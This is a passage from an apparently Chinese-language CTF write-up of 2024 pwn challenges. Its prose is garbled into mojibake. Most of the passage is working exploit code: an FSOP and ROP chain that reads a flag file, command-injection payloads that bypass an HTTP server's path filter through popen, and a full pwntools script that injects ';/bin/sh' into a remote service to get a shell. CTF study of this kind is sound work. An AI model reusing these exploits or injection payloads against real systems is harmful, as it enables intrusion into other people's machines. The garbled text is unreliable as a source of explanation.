class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>)</span><br><span class="line">target = stack - <span class="number">712</span> + <span class="number">8</span></span><br><span class="line">lg(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000016333a</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x00000000000904a9</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000091316</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret, target + <span class="number">0xc0</span>,</span><br><span class="line">    pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>,</span><br><span class="line">    pop_rsi_ret, target + <span class="number">0x150</span>,</span><br><span class="line">    pop_rdx_rbx_ret, <span class="number">0x30</span>,<span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line">    <span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h3><p>è¿™é¢˜å®ç°äº†ä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œå…¶åŠŸèƒ½æ˜¯å¯¹getè¯·æ±‚çš„è·¯å¾„è¿›è¡Œè®¿é—®ï¼Œå¦‚æœè·¯å¾„ä»¥åŠæ–‡ä»¶åˆæ³•å°±ä¼šæ‰“å°å‡ºæ–‡ä»¶çš„å†…å®¹</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç¨‹åºå¯¹æˆ‘ä»¬è¾“å…¥çš„è·¯å¾„è¿›è¡Œäº†ååˆ†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥è·å–<code>/flag</code>çš„å†…å®¹ï¼Œå› ä¸ºä¼šç»™è¿‡æ»¤æ‰ï¼Œå¯æ˜¯æˆ‘æ³¨æ„åˆ°äº†ä¸‹é¢æœ‰ä¸ª<code>popen</code>å‡½æ•°<br>å‡½æ•°çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">FILE * <span class="title function_">popen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command , <span class="type">const</span> <span class="type">char</span> *type )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pclose</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>å‡½æ•°è¯´æ˜ï¼š</p><blockquote><p>popen()å‡½æ•°é€šè¿‡åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œè°ƒç”¨fork()äº§ç”Ÿä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ‰§è¡Œä¸€ä¸ªshellä»¥è¿è¡Œå‘½ä»¤æ¥å¼€å¯ä¸€ä¸ªè¿›ç¨‹ã€‚è¿™ä¸ªç®¡é“å¿…é¡»ç”±pclose()å‡½æ•°å…³é—­ï¼Œè€Œä¸æ˜¯fclose()å‡½æ•°ã€‚pclose()å‡½æ•°å…³é—­æ ‡å‡†I&#x2F;Oæµï¼Œç­‰å¾…å‘½ä»¤æ‰§è¡Œç»“æŸï¼Œç„¶åè¿”å›shellçš„ç»ˆæ­¢çŠ¶æ€ã€‚å¦‚æœshellä¸èƒ½è¢«æ‰§è¡Œï¼Œåˆ™pclose()è¿”å›çš„ç»ˆæ­¢çŠ¶æ€ä¸shellå·²æ‰§è¡Œexitä¸€æ ·ã€‚<br>typeå‚æ•°åªèƒ½æ˜¯è¯»æˆ–è€…å†™ä¸­çš„ä¸€ç§ï¼Œå¾—åˆ°çš„è¿”å›å€¼ï¼ˆæ ‡å‡†I&#x2F;Oæµï¼‰ä¹Ÿå…·æœ‰å’Œtypeç›¸åº”çš„åªè¯»æˆ–åªå†™ç±»å‹ã€‚å¦‚æœtypeæ˜¯â€râ€åˆ™æ–‡ä»¶æŒ‡é’ˆè¿æ¥åˆ°commandçš„æ ‡å‡†è¾“å‡ºï¼›å¦‚æœtypeæ˜¯â€wâ€åˆ™æ–‡ä»¶æŒ‡é’ˆè¿æ¥åˆ°commandçš„æ ‡å‡†è¾“å…¥ã€‚<br>commandå‚æ•°æ˜¯ä¸€ä¸ªæŒ‡å‘ä»¥NULLç»“æŸçš„shellå‘½ä»¤å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚è¿™è¡Œå‘½ä»¤å°†è¢«ä¼ åˆ°bin&#x2F;shå¹¶ä½¿ç”¨-cæ ‡å¿—ï¼Œshellå°†æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ã€‚<br>popen()çš„è¿”å›å€¼æ˜¯ä¸ªæ ‡å‡†I&#x2F;Oæµï¼Œå¿…é¡»ç”±pcloseæ¥ç»ˆæ­¢ã€‚å‰é¢æåˆ°è¿™ä¸ªæµæ˜¯å•å‘çš„ï¼ˆåªèƒ½ç”¨äºè¯»æˆ–å†™ï¼‰ã€‚å‘è¿™ä¸ªæµå†™å†…å®¹ç›¸å½“äºå†™å…¥è¯¥å‘½ä»¤çš„æ ‡å‡†è¾“å…¥ï¼Œå‘½ä»¤çš„æ ‡å‡†è¾“å‡ºå’Œè°ƒç”¨popen()çš„è¿›ç¨‹ç›¸åŒï¼›ä¸ä¹‹ç›¸åçš„ï¼Œä»æµä¸­è¯»æ•°æ®ç›¸å½“äºè¯»å–å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºï¼Œå‘½ä»¤çš„æ ‡å‡†è¾“å…¥å’Œè°ƒç”¨popen()çš„è¿›ç¨‹ç›¸åŒã€‚</p></blockquote><p>å‡½æ•°ä½œç”¨ï¼š</p><blockquote><p>popenå‡½æ•°å…è®¸ä¸€ä¸ªç¨‹åºå°†å¦å¤–ä¸€ä¸ªç¨‹åºä½œä¸ºæ–°è¿›ç¨‹æ¥å¯åŠ¨ï¼Œå¹¶å¯ä»¥ä¼ é€’æ•°æ®æˆ–è€…é€šè¿‡å®ƒæ¥å—æ•°æ®ã€‚<br>å…¶å†…éƒ¨å®ç°ä¸ºè°ƒç”¨ fork äº§ç”Ÿä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ‰§è¡Œä¸€ä¸ª shellï¼Œ ä»¥è¿è¡Œå‘½ä»¤æ¥å¼€å¯ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹å¿…é¡»ç”± pclose() å‡½æ•°å…³é—­ã€‚</p></blockquote><p>è¿™ä¹ˆè¯´<code>popen</code>å‡½æ•°å°±ç±»ä¼¼äº<code>system</code>å‡½æ•°å¯ä»¥è®©æˆ‘ä»¬è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œå¯æ˜¯ç¨‹åºå¯¹æˆ‘ä»¬è¾“å…¥çš„è·¯å¾„è¿˜è¿›è¡Œäº†ç¬¬äºŒå±‚è¿‡æ»¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_1F74</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> needle[<span class="number">3</span>]; <span class="comment">// [esp+15h] [ebp-13h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(needle, <span class="string">&quot;sh&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;bin&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">38</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">124</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">59</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">36</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">123</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">125</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">96</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, needle) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strstr</span>(a1, v3) == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != __readgsdword(<span class="number">0x14</span>u) )</span><br><span class="line">    sub_2A70();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä½¿ç”¨<code>/bin/sh</code>æ¥èµ·shelläº†ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿä¸èƒ½ç›´æ¥<code>cat flag</code>ï¼Œå› ä¸ºè¿™ä¸­é—´æœ‰ç©ºæ ¼ï¼Œä¼šå¯¼è‡´ç¨‹åºåˆ¤æ–­æˆ‘ä»¬çš„getè¯·æ±‚æ ¼å¼é”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆå°†&#x2F;flagçš„å†…å®¹ä¿å­˜åˆ°å½“å‰ç›®å½•ä¸‹çš„tmpæ–‡ä»¶ä¸­ï¼Œç„¶åå†è¯»å–è¯¥tmpæ–‡ä»¶æ¥è·å–flag<br>è½¬ç§»flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;cat&lt;/flag&gt;tmp&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;get /&#123;&#125; HTTP/1.0\r&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(path).encode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Host: 256.256.256.256\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Content-Length: 1\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><p>è¯»å–flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;./tmp&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;get /&#123;&#125; HTTP/1.0\r&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(path).encode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Host: 256.256.256.256\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Content-Length: 1\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h3><p>è¿™é“é¢˜ç›®æ‰“çš„æ˜¯<code>C++</code>ä¸­çš„å¼‚å¸¸å¤„ç†ï¼Œå­˜åœ¨ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œå¯æ˜¯å¼€å¯äº†<code>canary</code>ï¼Œéœ€è¦ç”¨å¼‚å¸¸å¤„ç†æ¥ç»•è¿‡</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é‡Œæˆ‘ä¸€å¼€å§‹æƒ³çš„æ˜¯æ‰“ <code>CHOP</code>ï¼Œå¯æ˜¯é™„ä»¶é‡Œå¹¶æ²¡æœ‰ç»™å„ç§ä¾èµ–ï¼Œç„¶åæˆ‘å‘ç°äº†ä¸‹é¢è¿™ä¸ªä¸œä¸œ</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¥½å®¶ä¼™ï¼Œè¿™ä¸æ˜¯ç›´æ¥é€æˆ‘ä¸ª<code>system</code>å‡½æ•°å—ã€‚ç»è¿‡è°ƒè¯•ï¼Œè¿™ä¸ªåœ°æ–¹æ‰§è¡Œæ—¶<code>rdi</code>çš„å€¼ä¸€ç›´ä¸º<code>0x4040A0</code></p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™ä¸ªåœ°æ–¹å­˜å‚¨äº†ä¸€ä¸ªç”¨æ¥æŠ¥é”™çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ä¸Šé¢æœ‰ä¸€ä¸ªæ•°ç»„ï¼Œè¯¥ç¨‹åºå­˜åœ¨ä¸€ä¸ªè¯¥æ•°ç»„çš„è¶Šç•Œå†™</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å½“ç´¢å¼•ä¸º8æ—¶æˆ‘ä»¬å°±èƒ½åœ¨<code>0x4040A0</code>ä¸Šå†™æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™<code>/bin/sh</code>ï¼Œç„¶ååˆ©ç”¨<code>catch</code>ä¸­çš„<code>system</code>æ¥ç›´æ¥getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">34689</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your chocie:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">rop = <span class="number">0x404200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;You can record log details here:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Do you need to check the records?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[!] Type your message here plz:&#x27;</span>)</span><br><span class="line">payload = p64(rop+<span class="number">0x10</span>)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+p64(rop)*((<span class="number">0x70</span>//<span class="number">8</span>)-<span class="number">5</span>)+p64(rop+<span class="number">0x20</span>)+p64(<span class="number">0x401BC7</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="sandbox-after-competition"><a href="#sandbox-after-competition" class="headerlink" title="sandbox(after competition)"></a>sandbox(after competition)</h3><p>è¿™é¢˜æ˜¯æœ€æŠ½è±¡çš„ï¼Œæœ¬åœ°é€šå¯æ˜¯è¿œç¨‹ä¸é€šğŸ˜°ğŸ˜°ğŸ˜°ğŸ˜°ğŸ˜°ğŸ˜°<br>å…¸å‹çš„èœå•é¢˜ï¼Œç”³è¯·çš„å †å—å¤§å°åªè®¿é—®äº†<code>0x500-0x1000</code>ï¼Œ<code>delete</code>å‡½æ•°å­˜åœ¨æ˜æ˜¾çš„ <code>UAF</code> </p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ‰€ä»¥ç›´æ¥<code>larginbin attack</code>æ‰“<code>_IO_list_all</code>å³å¯ï¼Œå¯æ˜¯è¿™åªæ˜¯æ¶æ¢¦çš„å¼€å§‹ï¼Œè¿™é¢˜å¼€å¯äº†æ²™ç®±</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  